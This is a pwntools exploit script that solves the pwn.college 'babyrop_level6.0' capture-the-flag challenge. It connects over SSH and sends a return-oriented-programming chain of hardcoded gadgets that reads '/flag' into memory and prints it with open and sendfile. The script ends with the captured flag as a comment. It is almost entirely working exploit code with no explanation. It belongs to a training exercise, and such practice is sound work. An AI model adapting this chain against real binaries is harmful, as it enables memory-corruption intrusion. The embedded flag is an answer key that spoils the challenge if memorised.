from pwn import *

elf = ELF("./babyrop_level6.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

pop_rdi = 0x00000000004019df
pop_rsi = 0x00000000004019cf
pop_rcx = 0x00000000004019c7
pop_rdx = 0x00000000004019d7
pos = elf.bss() + 0x100
ret = 0x000000000040101a

io = s.process("/challenge/babyrop_level6.0")

io.send(b'a'*0x78 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(pos) + p64(pop_rdx) + p64(0x100) + p64(ret) + p64(elf.plt[b'read']) + p64(elf.entrypoint))
sleep(1)
io.send(b'/flag\x00')
sleep(1)

io.send(b'a'*0x78
    + p64(pop_rdi) + p64(pos) + p64(pop_rsi) + p64(0) + p64(elf.plt['open'])
    + p64(pop_rdi) + p64(1)   + p64(pop_rsi) + p64(0x3) + p64(pop_rdx) + p64(0) + p64(pop_rcx) + p64(0x100) + p64(elf.plt['sendfile'])
)

io.interactive()
# Flag: pwn.college{wU2PkW8w5WnE3HjzErX-X5jNXlI.0VM1MDLxIjNyEzW}